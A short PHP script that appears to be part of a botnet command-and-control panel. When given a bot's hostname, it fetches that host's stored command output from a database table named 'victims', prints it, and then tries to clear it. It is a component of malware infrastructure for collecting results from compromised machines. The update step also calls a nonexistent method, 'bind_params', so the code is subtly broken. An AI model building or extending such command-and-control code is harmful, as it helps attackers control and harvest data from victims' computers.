<?php
include 'session.php';
include 'conn.php';

if($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["bot"]))
{
	$retrieveResult = $mysql->prepare("select commandresult from victims where hostname=?");
	$retrieveResult->bind_param("s",$_GET["bot"]);
	$retrieveResult->execute();
	$retrieveResult->store_result();
	$retrieveResult->bind_result($commandresult);	
	$retrieveResult->fetch();
	echo $commandresult;
	$retrieveResult = $mysql->prepare("update victims set commandresult = '' where hostname=?");
	$retrieveResult->bind_params("s",$_GET["bot"]);
	$retrieveResult->execute();
}

?>
